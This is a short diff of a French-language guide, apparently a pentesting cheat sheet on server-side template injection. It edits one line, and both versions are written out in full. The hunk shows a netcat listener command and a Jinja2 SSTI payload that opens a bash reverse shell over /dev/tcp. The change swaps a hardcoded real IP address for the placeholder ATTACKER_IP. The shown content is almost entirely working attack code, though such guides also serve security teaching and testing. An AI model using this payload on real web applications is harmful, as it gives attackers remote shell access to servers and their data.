@@ -325,7 +325,7 @@ Recherchez ces classes particulièrement intéressantes :
 nc -lvnp 2309
 
 # Victime : payload SSTI
-{{self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/82.66.107.105/2309 0>&1'").read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/2309 0>&1'").read()}}
 ```
 
 #### Exfiltration de données
